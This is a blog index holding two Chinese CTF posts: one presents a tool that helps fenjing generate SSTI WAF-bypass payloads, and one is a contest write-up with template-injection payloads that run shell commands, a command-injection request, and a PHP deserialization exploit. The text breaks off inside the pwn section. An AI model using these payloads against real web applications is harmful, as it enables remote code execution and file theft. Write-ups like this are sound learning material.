<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>WAFPecker</title>
    <link href="/2024/12/20/WAFPecker/"/>
    <url>/2024/12/20/WAFPecker/</url>
    
    <content type="html"><![CDATA[<h1 id="WAFPecker-一款配合fenjing的SSTI-WAF-Bypass工具"><a href="#WAFPecker-一款配合fenjing的SSTI-WAF-Bypass工具" class="headerlink" title="WAFPecker- 一款配合fenjing的SSTI-WAF-Bypass工具"></a>WAFPecker- 一款配合fenjing的SSTI-WAF-Bypass工具</h1><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241743587.png" alt="image-20241221225512129"></p><blockquote><p><strong>GitHub 项目地址: [WAFPecker](<a href="https://github.com/YZS17/WAFPecker">YZS17&#x2F;WAFPecker: A tool for bypassing SSTI-WAF used in CTF in conjunction with fenjing. (github.com)</a>)</strong></p></blockquote><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>一款在<code>CTF</code>中配合<code>fenjing</code>使用的<code>SSTI WAF Bypass</code>工具</p><ul><li><p>作为一个正在学习<code>CTF</code>的小菜鸡，遇到题目能用工具一把嗦的时候，是能嗦则嗦，不想麻烦（<del>因为麻烦的题也不会<code>QAQ</code></del>），但是有些时候会因为一些不可抗拒的因素不能直接嗦题，需要本地调试，为了更好的**<del>嗦题</del>**学习，我写了这个工具。</p></li><li><p><code>SSTI</code>漏洞是<code>CTF</code>的<code>Web</code>方向常考的题型，在很多时候我们可以获取到源码，从而获取<code>WAF</code>的黑名单信息，需要我们根据黑名单来绕过，而<code>fenjing</code>不是所有时候都可以直接使用的，它需要根据回显来判断<code>payload</code>是否有效，但是难一些的题目经常会设计成无回显，这时候就需要我们修改源码，加上回显，再配合使用<code>fenjing</code>工具。（如2024长城杯的<code>Safe_proxy</code>,2024<code>pwnsecCTF</code>的<code>jinjia2 master</code>）</p></li><li><p><code>WAFPecker</code>就是为了解决这一类情况而编写的项目，直接输入<code>blacklist</code>，即可模拟<code>fenjing</code>可测试的环境，配合<code>fenjing</code>使用，快速生成有效<code>payload</code>。希望我的工具可以帮到您。</p></li><li><p>祝您好运！</p></li></ul></blockquote><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs /your_project_directory">/WAFPecker    <br>    app.py       //run this file to use this tool<br>    __init__.py<br>    views.py<br>    waf.py   //POST,you can also change to GET<br>    blacklist.txt   //write your WAF blacklist in  this file.<br>    requirement.txt <br></code></pre></td></tr></table></figure><h4 id="详细使用步骤"><a href="#详细使用步骤" class="headerlink" title="详细使用步骤"></a>详细使用步骤</h4><ul><li><p>打开<code> blacklist.txt</code>文件, 按照下面的样式写入你的<code>WAF</code>黑名单 。</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-symbol">&#x27;setstate</span>&#x27;, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-symbol">&#x27;exec</span>&#x27;, <span class="hljs-symbol">&#x27;__builtins__</span>&#x27;, <span class="hljs-symbol">&#x27;template</span>&#x27;, <span class="hljs-symbol">&#x27;render</span>&#x27;, &#x27;\\&#x27;,<span class="hljs-symbol">&#x27;compile</span>&#x27;, <span class="hljs-symbol">&#x27;requests</span>&#x27;, <span class="hljs-symbol">&#x27;exit</span>&#x27;,  <span class="hljs-symbol">&#x27;pickle</span>&#x27;,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>]<br></code></pre></td></tr></table></figure></li><li><p><code>Python app.py</code>  在终端中运行<code>app.py</code>文件 </p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241743670.png" alt="image-20241221223751030"></p></li><li><p>打开地址<code> http://127.0.0.1:5000</code>，浏览器显示以下页面，就是环境已经部署完毕。</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241743610.png" alt="image-20241221224045869"></p><h4 id="配合fenjing使用"><a href="#配合fenjing使用" class="headerlink" title="配合fenjing使用"></a>配合fenjing使用</h4></li><li><p>在终端中输入<code>fenjing webui</code>，运行<code>fenjing</code></p></li><li><p>请求方式填写<code>POST</code>,完成相关信息填写后，点击开始分析，等待右边显示<code>WAF</code>已绕过。就可以获得相关命令的<code>payload</code>了。</p></li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241743537.png" alt="image-20241221223237433"></p><ul><li>这样我们就获得了可以绕过当前<code>blacklist-WAF</code>的<code>payload</code></li></ul><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">&#123;%set iq=&#x27;so&#x27;[::-1]%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler.next</span>[&#x27;__g&#x27;&#x27;lobals__&#x27;][&#x27;_&#x27;&#x27;_builtins__&#x27;].__import__(<span class="hljs-name">iq</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>后续有时间的活会出一期使用<code>WAFPecker</code>解决2024长城杯和2024<code>PwnsecCTF</code>的<code>SSTI</code>题目的文章，和大家一起学习，不足之处，请多多指正，谢谢大家！</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>Tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI-fenjing-思路总结</title>
    <link href="/2024/12/20/2024%20%E6%A5%9A%E6%85%A7%E6%9D%AF%20wp/"/>
    <url>/2024/12/20/2024%20%E6%A5%9A%E6%85%A7%E6%9D%AF%20wp/</url>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1-1"></a>1-1</h3><ul><li>保持Header发包就行</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_expression</span>(<span class="hljs-params">response_text</span>):<br>    <span class="hljs-comment"># 使用正则表达式匹配算术表达式</span><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;Calculate: (\d+) ([+\-*/]) (\d+)&#x27;</span>, response_text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        num1, operator, num2 = <span class="hljs-keyword">match</span>.groups()<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(num1), operator, <span class="hljs-built_in">int</span>(num2)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_expression</span>(<span class="hljs-params">num1, operator, num2</span>):<br>    <span class="hljs-comment"># 计算算术表达式的结果</span><br>    <span class="hljs-keyword">if</span> operator == <span class="hljs-string">&#x27;+&#x27;</span>:<br>        <span class="hljs-keyword">return</span> num1 + num2<br>    <span class="hljs-keyword">elif</span> operator == <span class="hljs-string">&#x27;-&#x27;</span>:<br>        <span class="hljs-keyword">return</span> num1 - num2<br>    <span class="hljs-keyword">elif</span> operator == <span class="hljs-string">&#x27;*&#x27;</span>:<br>        <span class="hljs-keyword">return</span> num1 * num2<br>    <span class="hljs-keyword">elif</span> operator == <span class="hljs-string">&#x27;/&#x27;</span>:<br>        <span class="hljs-keyword">if</span> num2 != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> num1 / num2<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;除数不能为0&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">poc_szfIR</span>(<span class="hljs-params">url, headers, answer</span>):<br>    res = requests.post(url=url, headers=headers, data=&#123;<span class="hljs-string">&quot;answer&quot;</span>: answer&#125;, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">return</span> res.text<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&quot;http://139.155.126.78:21851/&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Length&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=2028d8a46dded801e712c2b7004cd268&quot;</span>,<br>        <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;139.155.126.78:21851&quot;</span>,<br>        <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://139.155.126.78:21851&quot;</span>,<br>        <span class="hljs-string">&quot;Priority&quot;</span>: <span class="hljs-string">&quot;u=0, i&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://139.155.126.78:21851&quot;</span>,<br>        <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0&quot;</span><br>    &#125;<br>    correct_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>        response = requests.get(url, headers=headers, verify=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            num1, operator, num2 = get_expression(response.text)<br>            <span class="hljs-keyword">if</span> num1 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> operator <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> num2 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">try</span>:<br>                    answer = calculate_expression(num1, operator, num2)<br>                    result = poc_szfIR(url, headers, <span class="hljs-built_in">str</span>(answer))<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;提交答案: <span class="hljs-subst">&#123;answer&#125;</span>, 服务器响应: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Correct&quot;</span> <span class="hljs-keyword">in</span> result:<br>                        correct_count += <span class="hljs-number">1</span><br>                <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;计算错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;未能找到有效的算术表达式，跳过提交&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败，状态码: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>        <span class="hljs-comment"># time.sleep(1)  # 每次请求间隔1秒，避免过于频繁的请求</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;正确次数: <span class="hljs-subst">&#123;correct_count&#125;</span>/30&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908819.png" alt="img"></p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908859.png" alt="img"></p><h3 id="1-2"><a href="#1-2" class="headerlink" title="1-2"></a>1-2</h3><ul><li><code>search</code>处<code>SSTI  &#123;&#123;100-2&#125;&#125;</code></li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908673.png" alt="img"></p><ul><li>fenjing一把嗦</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908835.png" alt="img"></p><ul><li>payload</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">提交表单完成，返回值为<span class="hljs-number">200</span>，输入为&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&quot;&#123;%print ((g.pop.__globals__.__getitem__(&#x27;__b&#x27;&#x27;uiltins__&#x27;)).__getitem__(&#x27;__i&#x27;&#x27;mport__&#x27;))(&#x27;os&#x27;).popen(&#x27;c&#x27;&#x27;at /flag&#x27;).read()%&#125;&quot;</span>&#125;，表单为&#123;<span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;/search&#x27;</span>, <span class="hljs-string">&#x27;method&#x27;</span>: <span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;inputs&#x27;</span>: &#123;<span class="hljs-string">&#x27;name&#x27;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="1-3"><a href="#1-3" class="headerlink" title="1-3"></a>1-3</h3><ul><li>C处RCE</li><li>先ls，题目提示了pop，找pop文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Python">POST /index.php HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">139.155</span><span class="hljs-number">.126</span><span class="hljs-number">.78</span>:<span class="hljs-number">31743</span><br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.8</span>,zh-TW;q=<span class="hljs-number">0.7</span>,zh-HK;q=<span class="hljs-number">0.5</span>,en-US;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept-Encoding: gzip, deflate<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">133.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">133.0</span><br>Origin: http://<span class="hljs-number">139.155</span><span class="hljs-number">.126</span><span class="hljs-number">.78</span>:<span class="hljs-number">31743</span><br>Cookie: PHPSESSID=2028d8a46dded801e712c2b7004cd268; session=.eJyrVko1SjS1SDQy0DVLMrfUNTE3Mda1TDZL0000Tk02S7E0ME9JTFayUvJ1CnNW0lEqTi0uzszPi89MAYoRpbUWAEKLG1k.Z2T3ow.us-IsOtP-<span class="hljs-number">4</span>inTDaqKWGYEDJ8oOI<br>Content-<span class="hljs-type">Type</span>: application/x-www-form-urlencoded<br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,*/*;q=<span class="hljs-number">0.8</span><br>Priority: u=<span class="hljs-number">0</span>, i<br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Referer: http://<span class="hljs-number">139.155</span><span class="hljs-number">.126</span><span class="hljs-number">.78</span>:<span class="hljs-number">31743</span>/index.php<br>Content-Length: <span class="hljs-number">18</span><br><br>lsj=<span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span>%3Bnl+*<br>nl *  读取所有文件<br></code></pre></td></tr></table></figure><ul><li>读到<code>p0pmart.php</code>文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs Python">&lt;?php<br>error_reporting(<span class="hljs-number">0</span>);<br>require_once(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">popmart</span>&#123;<br>    public $yuki;<br>    public $molly;<br>    public $dimoo;<br><br>    public function __construct()&#123;<br>        $this-&gt;yuki=<span class="hljs-string">&#x27;tell me where&#x27;</span>;<br>        $this-&gt;molly=<span class="hljs-string">&#x27;dont_tell_you&#x27;</span>;<br>        $this-&gt;dimoo=<span class="hljs-string">&quot;you_can_guess&quot;</span>;<br>    &#125;<br><br>    public function __wakeup()&#123;<br>        <span class="hljs-keyword">global</span> $flag;<br>        <span class="hljs-keyword">global</span> $where_you_go;<br>        $this-&gt;yuki=$where_you_go;<br><br>        <span class="hljs-keyword">if</span>($this-&gt;molly === $this-&gt;yuki)&#123;<br>            echo $flag;<br>        &#125;<br>    &#125;<br>&#125;<br><br>$pucky = $_GET[<span class="hljs-string">&#x27;wq&#x27;</span>];<br><span class="hljs-keyword">if</span>(isset($pucky))&#123;<br>    <span class="hljs-keyword">if</span>($pucky===<span class="hljs-string">&quot;二仙桥&quot;</span>)&#123;<br>        extract($_POST);<br>        <span class="hljs-keyword">if</span>($pucky===<span class="hljs-string">&quot;二仙桥&quot;</span>)&#123;    <br>            die(<span class="hljs-string">&quot;&lt;script&gt;window.alert(&#x27;说说看，你要去哪？？&#x27;);&lt;/script&gt;&quot;</span>);<br>        &#125;<br>        unserialize($pucky);<br>    &#125;<br>&#125;<br><br>error_reporting(<span class="hljs-number">0</span>);<br>include <span class="hljs-string">&quot;auth.php&quot;</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Als</span>&#123;<br>    public $text;<br>    public $<span class="hljs-built_in">dict</span>;<br><br>    public function __wakeup()<br>    &#123;<br>        <span class="hljs-keyword">if</span> ($this-&gt;text == <span class="hljs-string">&quot;helloworld&quot;</span>)&#123;<br>            $this-&gt;<span class="hljs-built_in">dict</span>-&gt;init();<br>        &#125;<br>    &#125;<br><br>    public function __toString()<br>    &#123;<br>       $this-&gt;text-&gt;undefinedProperty = <span class="hljs-string">&#x27;New Value&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;HACKER&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Kl</span>&#123;<br>    public $apple;<br>    public $phone;<br>    public $var;<br><br>    public function __call($name, $arguments)<br>    &#123;<br>         echo $this-&gt;apple;<br>    &#125;<br><br>    public function __get($name)<br>    &#123;<br>        foreach($_GET <span class="hljs-keyword">as</span> $key =&gt; $value)&#123;<br>            $$key=$$value;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($_GET==<span class="hljs-string">&quot;Hack&quot;</span>)&#123;<br>            <span class="hljs-keyword">if</span> (isset($this-&gt;var))&#123;<br>                $arr[$this-&gt;var]=<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span> ($arr[]=<span class="hljs-number">1</span>)&#123;<br>                    die(<span class="hljs-string">&quot;Hack!!&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    $this-&gt;content = file_get_contents($this -&gt; phone);<br>                    echo $this-&gt;content;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Glb</span>&#123;<br>    public $boy;<br>    public $gay;<br>    private $cc;<br><br>    public function init($a,$b) &#123;<br>        $this-&gt;boy=$a;<br>        $this-&gt;gay=$b;<br>    &#125;<br><br>    public function __<span class="hljs-built_in">set</span>($name, $value)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(isset($this-&gt;boy))&#123;<br>            print_r(<span class="hljs-string">&quot;1314&quot;</span>);<br>            <span class="hljs-keyword">return</span> $this-&gt;boy-&gt;name;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(isset($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    $serializecmd = $_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    $unserializecmd = unserialize($serializecmd);<br>    $unserializecmd-&gt;init();<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><ul><li>wq&#x3D;二仙桥，extract函数覆盖pubcky使他≠二仙桥__wakeup()函数，yuki&#x3D;molly,再用extract变量覆盖，EXP如下</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs Python">&lt;?php<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">popmart</span>&#123;<br>        public $yuki;<br>        public $molly;<br>        public $dimoo;<br>        public function __construct()&#123;<br>            $this-&gt;yuki=<span class="hljs-string">&#x27;tell me where&#x27;</span>;<br>            $this-&gt;molly=<span class="hljs-string">&#x27;dont_tell_you&#x27;</span>;<br>            $this-&gt;dimoo=<span class="hljs-string">&quot;you_can_guess&quot;</span>;<br>        &#125;<br>        public function __wakeup()&#123;<br>            <span class="hljs-keyword">global</span> $flag;<br>            <span class="hljs-keyword">global</span> $where_you_go;<br>            $this-&gt;yuki=$where_you_go;<br>            <span class="hljs-keyword">if</span>($this-&gt;molly === $this-&gt;yuki)&#123;<br>                echo $flag;<br>            &#125;<br>        &#125;<br>    &#125;<br>    $a = new popmart();<br>    $b = serialize($a);<br>    echo $b;<br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908660.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;popmart&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;yuki&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;tell me where&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;molly&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;dont_tell_you&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;dimoo&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;you_can_guess&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908708.png" alt="img"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="2-1"><a href="#2-1" class="headerlink" title="2-1"></a>2-1</h3><p>发现开了沙盒，禁用execve</p><p>Add功能正常,Free功能无uaf , edit功能存在off by one</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908667.png" alt="img"></p><p>gift功能</p><p>输入1可以泄露堆地址，输入其他的可以泄露bss地址，拿到pie</p><p>off by one打bss上的stdout结构体为p64(0xfbad1800) + p64(0)*3 + b’\x00’</p><p>泄露libc，打freehook为setcontext，最后free触发，即可orw拿到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 